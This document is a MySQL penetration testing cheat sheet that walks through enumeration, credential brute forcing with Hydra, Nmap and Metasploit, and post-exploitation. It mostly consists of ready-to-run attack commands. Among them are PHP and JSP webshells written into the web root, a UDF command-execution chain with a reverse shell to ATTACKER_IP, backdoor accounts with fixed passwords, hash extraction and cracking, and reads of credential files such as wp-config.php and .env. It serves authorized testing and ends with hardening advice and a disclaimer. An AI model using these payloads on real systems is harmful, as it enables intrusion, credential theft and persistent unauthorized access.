MySQL Penetration Testing Guide
Overview
Default Port: 3306

MySQL is an open source relational database management system (RDBMS) widely used worldwide. Databases are used to store and manage interrelated data. MySQL is a preferred solution in many areas such as web-based applications, data storage, e-commerce, and log records. SQL (Structured Query Language) is the language MySQL uses to communicate with the database.

Connection Methods
Using mysql Client
bash
# Local connection (no password)
mysql -u root

# Local connection with password
mysql -u username -p

# Connect to specific database
mysql -u username -p database_name

# Remote connection
mysql -u username -h target.com -P 3306 -p

# Connect and execute query
mysql -u username -p -e "SELECT @@version;"

# Connect without database selection
mysql -u username -h target.com -p --skip-database
Using mysqldump
bash
# Dump specific database
mysqldump -u username -p database_name > backup.sql

# Dump all databases
mysqldump -u username -p --all-databases > all_databases.sql

# Dump specific table
mysqldump -u username -p database_name table_name > table.sql

# Remote dump
mysqldump -u username -h target.com -p database_name > remote_backup.sql
Connection URL Format
text
mysql://username:password@hostname:port/database_name
mysql://root:password@target.com:3306/app_db
Reconnaissance
Service Detection with Nmap
bash
# Basic port scan
nmap -p 3306 target.com

# Service version detection
nmap -p 3306 -sV target.com

# Safe scripts
nmap -p 3306 --script mysql-info target.com

# Aggressive scan
nmap -p 3306 -A target.com
Banner Grabbing
bash
# Using netcat
nc -vn target.com 3306

# Using telnet
telnet target.com 3306

# Using nmap with banner script
nmap -p 3306 --script banner target.com
Enumeration
Version Detection
sql
-- MySQL version
SELECT @@version;
SELECT VERSION();

-- Server information
SELECT @@version_compile_os;
SELECT @@version_compile_machine;

-- Detailed version info
SHOW VARIABLES LIKE "%version%";
Database Enumeration
sql
-- List all databases
SHOW DATABASES;
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;

-- Current database
SELECT DATABASE();

-- Database size
SELECT 
  table_schema AS 'Database',
  ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.TABLES 
GROUP BY table_schema;
User Enumeration
sql
-- List MySQL users
SELECT user, host FROM mysql.user;

-- Current user
SELECT USER();
SELECT CURRENT_USER();

-- User privileges
SHOW GRANTS;
SHOW GRANTS FOR 'username'@'host';

-- List users with FILE privilege
SELECT user, host FROM mysql.user WHERE File_priv = 'Y';

-- List users with SUPER privilege
SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
Table and Column Enumeration
sql
-- List tables in current database
SHOW TABLES;
SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE();

-- List columns in specific table
SHOW COLUMNS FROM table_name;
SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';

-- Find sensitive columns
SELECT table_name, column_name FROM information_schema.COLUMNS 
WHERE column_name LIKE '%password%' 
   OR column_name LIKE '%pass%'
   OR column_name LIKE '%pwd%'
   OR column_name LIKE '%secret%'
   OR column_name LIKE '%token%';

-- Count rows in tables
SELECT table_name, table_rows FROM information_schema.TABLES 
WHERE table_schema = DATABASE();
Privilege Enumeration
sql
-- Check FILE privilege (for LOAD_FILE/INTO OUTFILE)
SELECT file_priv FROM mysql.user WHERE user='current_user';

-- Check for dangerous privileges
SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv, 
       Create_priv, Drop_priv, File_priv, Super_priv 
FROM mysql.user;

-- Current user permissions
SELECT * FROM information_schema.USER_PRIVILEGES WHERE grantee LIKE '%username%';
Configuration Enumeration
sql
-- Important variables
SHOW VARIABLES LIKE 'secure_file_priv';  -- File operations directory
SHOW VARIABLES LIKE 'plugin_dir';        -- Plugin directory
SHOW VARIABLES LIKE 'datadir';           -- Data directory
SHOW VARIABLES LIKE 'basedir';           -- Base directory

-- Check if local_infile enabled
SHOW VARIABLES LIKE 'local_infile';

-- Process list
SHOW PROCESSLIST;
Metasploit Modules
Module	Command	Purpose
Version Detection	use auxiliary/scanner/mysql/mysql_version	Detect MySQL version
User Enumeration	use auxiliary/admin/mysql/mysql_enum	Enumerate users & privileges
Schema Dump	use auxiliary/scanner/mysql/mysql_schemadump	Dump database schema
Hash Dump	use auxiliary/scanner/mysql/mysql_hashdump	Extract password hashes
Login Brute Force	use auxiliary/scanner/mysql/mysql_login	Brute force credentials
Example:

bash
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS target.com
set USERNAME root
set PASSWORD password
run
Attack Vectors
Default Credentials
bash
mysql -u root -p
# Try empty password or common defaults:
# root, admin, mysql, user, test
Bruteforcing Credentials
Using Hydra
bash
hydra -L users.txt -P passwords.txt mysql://target.com
hydra -l root -P rockyou.txt mysql://192.168.1.100
Using Nmap
bash
nmap -p 3306 --script mysql-brute target.com
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt target.com
Using Metasploit
bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS target.com
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set STOP_ON_SUCCESS true
run
Post-Exploitation
File Operations
sql
-- Read files from server
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

-- Write files to server
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Check file operation restrictions
SHOW VARIABLES LIKE 'secure_file_priv';
User Defined Functions (UDF) for RCE
sql
-- Upload UDF library (if FILE privilege available)
SELECT 0x[hex_encoded_library] INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys_exec.so';

-- Create function
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_sys_exec.so';

-- Execute commands
SELECT sys_exec('whoami');
SELECT sys_exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
Webshell Upload
sql
-- PHP webshell
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';

-- JSP webshell
SELECT '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' 
INTO OUTFILE '/var/www/html/shell.jsp';
Privilege Escalation
sql
-- Create new admin user
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- Modify existing user password (MySQL < 5.7)
UPDATE mysql.user SET password=PASSWORD('newpassword') WHERE user='root';
FLUSH PRIVILEGES;

-- Grant FILE privilege
GRANT FILE ON *.* TO 'username'@'localhost';
FLUSH PRIVILEGES;
Password Hash Extraction
sql
-- MySQL < 5.7
SELECT user, password FROM mysql.user;

-- MySQL >= 5.7
SELECT user, authentication_string FROM mysql.user;

-- Export hashes to file
SELECT user, authentication_string FROM mysql.user 
INTO OUTFILE '/tmp/hashes.txt';
Hash Cracking
bash
# Extract hashes
mysql -u root -p -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user" > mysql_hashes.txt

# Crack with hashcat (MySQL 5+)
hashcat -m 300 mysql_hashes.txt rockyou.txt

# Crack with John the Ripper
john --format=mysql-sha1 mysql_hashes.txt
Data Exfiltration
sql
-- Extract sensitive data
SELECT * FROM users WHERE role='admin';
SELECT username, password, email FROM accounts;

-- Export database to CSV
SELECT * FROM sensitive_table 
INTO OUTFILE '/tmp/exfiltrated_data.csv'
FIELDS TERMINATED BY ',' 
ENCLOSED BY '"'
LINES TERMINATED BY '\n';
Persistence Techniques
sql
-- Create backdoor user
CREATE USER 'support'@'%' IDENTIFIED BY 'SupportP@ss123!';
GRANT ALL PRIVILEGES ON *.* TO 'support'@'%';
FLUSH PRIVILEGES;

-- Create stored procedure backdoor
DELIMITER //
CREATE PROCEDURE backdoor()
BEGIN
  DECLARE cmd CHAR(255);
  DECLARE result TEXT;
  SET cmd = 'whoami';
  SET result = sys_eval(cmd);
  SELECT result;
END //
DELIMITER ;
Credential Harvesting from Files
bash
# Debian MySQL maintenance user
cat /etc/mysql/debian.cnf

# MySQL configuration files
cat /etc/mysql/my.cnf
cat ~/.my.cnf

# MySQL history (may contain passwords)
cat ~/.mysql_history

# Application config files
cat /var/www/html/wp-config.php
cat /var/www/html/.env
Common MySQL Commands
Command	Description	Usage
SHOW DATABASES;	Lists all databases	SHOW DATABASES;
USE	Switch to database	USE database_name;
SHOW TABLES;	Display all tables	SHOW TABLES;
SELECT	Retrieve data	SELECT * FROM table_name;
INSERT INTO	Insert record	INSERT INTO table (col1) VALUES (val1);
UPDATE	Update records	UPDATE table SET col1=val1 WHERE condition;
DELETE FROM	Delete records	DELETE FROM table WHERE condition;
CREATE USER	Create new user	CREATE USER 'user'@'host' IDENTIFIED BY 'pass';
GRANT	Grant privileges	GRANT ALL ON db.* TO 'user'@'host';
FLUSH PRIVILEGES;	Reload privileges	FLUSH PRIVILEGES;
LOAD_FILE()	Read file	SELECT LOAD_FILE('/etc/passwd');
INTO OUTFILE	Write to file	SELECT * INTO OUTFILE '/tmp/file.txt';
Useful Tools
Tool	Description	Primary Use Case
mysql	Official MySQL client	Direct database access
mysqldump	Database backup tool	Data extraction
Metasploit	Exploitation framework	Automated testing
sqlmap	SQL injection tool	Automated exploitation
Hydra	Password cracker	Brute force attacks
John the Ripper	Password cracker	Hash cracking
hashcat	Password recovery	Advanced hash cracking
Nmap	Network scanner	Service detection
Medusa	Network login cracker	Brute force alternative
Security Best Practices
Change default passwords - Always change default MySQL credentials

Restrict network access - Bind MySQL to localhost if not needed remotely

Use strong passwords - Implement complex password policies

Limit privileges - Follow principle of least privilege

Regular updates - Keep MySQL updated with security patches

Enable logging - Monitor for suspicious activities

Encrypt connections - Use SSL/TLS for remote connections

Secure file privileges - Restrict FILE privilege to trusted users only

Legal Disclaimer
⚠️ IMPORTANT: This guide is for educational and authorized penetration testing purposes only. Unauthorized access to computer systems is illegal and punishable by law. Always obtain proper authorization before testing any system. The author is not responsible for any misuse of this information.

